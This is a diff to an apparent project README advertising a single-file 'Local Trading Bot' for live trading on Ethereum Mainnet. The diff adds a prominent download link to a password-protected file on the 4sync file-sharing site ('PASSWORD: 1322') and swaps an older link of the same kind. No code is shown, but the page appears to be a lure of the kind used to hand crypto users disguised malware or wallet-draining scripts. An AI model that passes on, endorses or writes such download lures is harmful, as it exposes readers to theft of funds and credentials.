@@ -13,6 +13,9 @@
 
 Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a simple tool for real trading on the **Ethereum Mainnet**. Everything is packed in **one HTML file**, so you can run it directly on **CodePen** with zero hassle! 😎 The interface is inspired by VS Code — clean and intuitive — perfect for trading straight from your browser. Here’s how it works!
 
+
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+## PASSWORD: 1322
   
 
 ## Features
@@ -70,8 +73,8 @@ Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a si
 
 
 
-  # [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
-## PASSWORD: 1322  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+## PASSWORD: 1322
 
 
 
